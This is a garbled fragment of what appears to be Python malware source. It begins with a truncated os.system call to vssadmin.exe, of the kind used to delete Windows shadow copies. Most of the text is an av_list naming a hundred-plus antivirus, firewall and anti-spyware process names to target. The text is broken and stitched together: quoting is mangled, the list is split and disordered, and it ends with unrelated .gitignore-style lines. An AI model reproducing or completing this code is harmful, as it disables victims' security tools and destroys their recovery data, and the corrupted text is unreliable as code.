    os.system('vssadmin.exe
"               'a2hijackfree.exe', 'a2scan.exe', 'a2service.exe', 'a2start.exe', 'a2sys.exe','a2upd.exe"
"               'aawservice.exe', 'aawtray.exe', 'ad-aware.exe', 'ad-watch.exe', 'alescan.exe"
"               'ashmaisv.exe', 'ashserv.exe', 'ashwebsv.exe', 'aswupdsv.exe', 'atrack.exe"
"               'avgcc.exe', 'avgctrl.exe', 'avgemc.exe', 'avgnt.exe', 'avgtcpsv.exe', 'avguard.exe"
"               'avkbar.exe', 'avk.exe', 'avkpop.exe', 'avkproxy.exe', 'avkservice.exe"
"               'avkwctl.exe', 'avmailc.exe', 'avp.exe', 'avpm.exe', 'avpmwrap.exe', 'avsched32.exe"
"               'avwupsrv.exe', 'avz.exe', 'bdagent.exe', 'bdmcon.exe', 'bdnagent.exe', 'bdss.exe"
"               'blackice.exe', 'blink.exe', 'boc412.exe', 'boc425.exe', 'bocore.exe', 'bootwarn.exe"
"               'ccapp.exe', 'ccevtmgr.exe', 'ccimscan.exe', 'ccproxy.exe', 'ccpwdsvc.exe', 'ccpxysvc.exe"
"               'cfp.exe', 'clamd.exe', 'clamservice.exe', 'clamtray.exe', 'cmdagent.exe', 'cpd.exe"
"               'dcsuserprot.exe', 'defensewall.exe', 'defensewall_serv.exe', 'defwatch.exe"
"               'f-prot.exe', 'fprot.exe', 'fsaua.exe', 'fsav32.exe', 'f-sched.exe', 'fsdfwd.exe"
"               'f-stopw.exe', 'f-stopw.exe', 'fwservice.exe', 'fwsrv.exe', 'iamstats.exe', 'iao.exe"
"               'idsinst.exe', 'idslu.exe', 'inetupd.exe', 'irsetup.exe', 'isafe.exe', 'isignup.exe"
"               'kavsvc.exe', 'klswd.exe', 'kpf4gui.exe', 'kpf4ss.exe', 'livesrv.exe', 'lpfw.exe"
"               'mcmnhdlr.exe', 'mcrdsvc.exe', 'mcshield.exe', 'mctskshd.exe', 'mcvsshld.exe"
"               'mscifapp.exe', 'msfwsvc.exe', 'msgsys.exe', 'msssrv.exe', 'navapsvc.exe', 'navapw32.exe"
"               'navw32.exe', 'nisemsvr.exe', 'nisum.exe', 'nmain.exe', 'noads.exe', 'nod32krn.exe"
"               'npfmntor.exe', 'nprotect.exe', 'nsmdtr.exe', 'oasclnt.exe', 'ofcdog.exe', 'opscan.exe"
"               'paamsrv.exe', 'pavfnsvr.exe', 'pcclient.exe', 'pccpfw.exe', 'pccwin98.exe', 'persfw.exe"
"               'qdcsfs.exe', 'rtvscan.exe', 'sadblock.exe', 'safe.exe', 'sandboxieserver.exe"
"               'sbserv.exe', 'scfservice.exe', 'sched.exe', 'schedm.exe', 'schedulerdaemon.exe"
"               'sgmain.exe', 'slee503.exe', 'smartfix.exe', 'smc.exe','snoopfreesvc.exe"
"               'spyblocker.exe', 'spybotsd.exe', 'spysweeper.exe', 'spysweeperui.exe"
"               'ssu.exe', 'steganos5.exe', 'stinger.exe', 'swdoctor.exe', 'swupdate.exe', 'symlcsvc.exe"
"               'symwscno.exe', 'tcguard.exe', 'tds2-98.exe', 'tds-3.exe', 'teatimer.exe', 'tgbbob.exe"
"               'umxagent.exe', 'umxcfg.exe', 'umxfwhlp.exe', 'umxlu.exe', 'umxpol.exe', 'umxtray.exe"
"               'vetmsg.exe','vptray.exe', 'vsaccess.exe', 'vsserv.exe', 'wcantispy.exe"
"               'wrsssdk.exe', 'xcommsvr.exe', 'xfr.exe', 'xp-antispy.exe', 'zegarynka.exe"
"    av_list = ['a2adguard.exe', 'a2adwizard.exe', 'a2antidialer.exe', 'a2cfg.exe', 'a2cmd.exe"
"', 'a2free.exe', 'a2guard.exe"
"', 'aavgapi.exe"
"', 'anvir.exe', 'ashdisp.exe"
"', 'avgagent.exe', 'avgamsvr.exe"
"', 'avgupsvc.exe', 'avgw.exe"
"', 'avktray', 'avktray.exe"
"', 'avwebgrd.exe', 'avwin.exe"
"', 'bdswitch.exe', 'blackd.exe"
"', 'cavrid.exe', 'cavtray.exe"
"', 'ccsetmgr.exe', 'cfgwiz.exe"
"', 'cpf.exe', 'csinsmnt.exe"
"', 'f-agnt95.exe', 'fpavupdm.exe', 'f-prot95.exe"
"', 'fsm32.exe', 'fsma32.exe', 'fssm32.exe"
"', 'icload95.exe', 'icmon.exe"
"', 'issvc.exe', 'kav.exe', 'kavss.exe"
"', 'mcagent.exe', 'mcdetect.exe"
"', 'mghtml.exe', 'mpftray.exe', 'msascui.exe"
"', 'navlogon.dll', 'navstub.exe"
"', 'nod32kui.exe', 'nod32ra.exe"
"', 'ossec-agent.exe', 'outpost.exe"
"', 'protector.exe', 'qconsole.exe"
"', 'savscan.exe', 'sbiectrl.exe', 'sbiesvc.exe"
"', 'sdhelp.exe', 'serv95.exe', 'sgbhp.exe"
"', 'snoopfreeui.exe', 'spbbcsvc.exe', 'sp_rsser.exe"
"', 'spywareguard.dll', 'spywareterminatorshield.exe"
"', 'tgbstarter.exe', 'tsatudt.exe"
"', 'usrprmpt.exe', 'vetmsg9x.exe"
"', 'win-bugsfix.exe', 'winpatrol.exe', 'winpa""""rolex.exe"
"', 'zlclient.exe"
"','symundo.exe', 'symwsc.exe"
*.exe
.paket/paket.exe
